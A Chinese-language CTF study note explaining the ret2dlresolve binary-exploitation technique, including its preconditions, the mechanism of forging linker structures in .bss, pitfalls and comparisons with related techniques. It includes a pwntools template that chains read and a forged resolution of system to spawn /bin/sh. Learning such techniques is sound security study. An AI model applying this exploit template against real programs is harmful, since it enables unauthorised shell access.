# Pwn 进阶笔记：Ret2dlresolve（伪造动态链接）

## 一、 核心思想与背景
- **核心思想**：把它想象成**“伪造证件”**。当程序内部没有 `system`，也不给你任何输出函数（无法泄露 Libc 地址）时，我们利用程序自带的 `read` 函数，在 `.bss` 段上伪造一套动态链接器需要的结构（假的字符串表、符号表、重定位表）。然后欺骗系统去解析，系统就会乖乖把 `system` 的地址解析出来并执行 `"/bin/sh"`。

## 二、 适用条件（前置条件）
必须同时满足以下三点，否则无法使用：
1. **No PIE**：因为我们需要把伪造的结构写到 `.bss` 段，如果开了 PIE，找不到固定的写入地址。
2. **Partial RELRO（或 No RELRO）**：这意味着程序开启了“延迟绑定”。如果开启了 Full RELRO，程序启动时会解析所有函数，GOT 表只读，这个技术就失效了。
3. **有可用的写入函数**：比如有 `read` 或 `gets`，用于将伪造的表结构写入内存。

## 三、 底层原理（查表机制）
正常延迟绑定流程：程序调用外部函数 -> 查 `.rela.plt` (重定位表) -> 查 `.dynsym` (符号表) -> 查 `.dynstr` (字符串表) -> 找到函数名 -> 解析真实地址。
**攻击流程**：
我们在 `.bss` 段伪造上述的 `rela`、`sym` 和字符串 `"system"`，然后用 ROP 链触发解析，骗系统去解析我们伪造的“system”。

## 四、 自动化利用模板（极度舒适）
手搓 Ret2dlresolve 的 Payload 极其折磨，所以实战中我们直接用 pwntools 的自动化模块解决：

```python
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
elf = ELF('./pwn')

# 1. 自动生成伪造的伪造结构 (Rela, Sym, 字符串"system"和"/bin/sh")
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

# 2. 构造 ROP 链
rop = ROP(elf)
# 第一步：利用程序现有的 read 函数，把伪造的数据写到 .bss 段
rop.read(0, dlresolve.data_addr) 
# 第二步：让 pwntools 自动生成触发解析的代码 (跳 PLT0 等)
rop.ret2dlresolve(dlresolve)     

# 3. 发送阶段
# 假设偏移量已知，rop.chain() 会生成 ROP 链
payload1 = b'A' * offset + rop.chain()
p.recvuntil(b"Input:")
p.sendline(payload1)

# 紧接着发送 dlresolve.payload（这就是会被 read 写到 .bss 的伪造结构数据）
p.sendline(dlresolve.payload) 

p.interactive()
```

## 五、 常见踩坑点
1. **dlresolve.data_addr 冲突**：`pwntools` 自动选的 `.bss` 地址可能不够好，如果报错，可以手动覆盖 `dlresolve.data_addr = elf.bss() + 0x800`。
2. **栈对齐**：64位下，在触发 `ret2dlresolve` 前如果崩溃，可能需要在 ROP 链开头垫一个纯 `ret` 指令。
3. **数据包粘连**：`payload1` 和 `dlresolve.payload` 发送时，如果中间被换行符或者其他输入截断，伪造结构写不进去就会失败，建议用 `send()` 而不是 `sendline()`，必要时加 `sleep(0.1)`。

## 六、 与其他技术的对比
- **Ret2Libc**：需要泄露真实地址。有输出函数就能打。
- **Ret2dlresolve**：不需要泄露地址。没输出函数、没 Libc 时的终极解法。
- **Ret2CSU**：解决传参缺失的问题（没 pop 指令）；dlresolve 解决的是函数地址缺失的问题。两者经常缝合使用。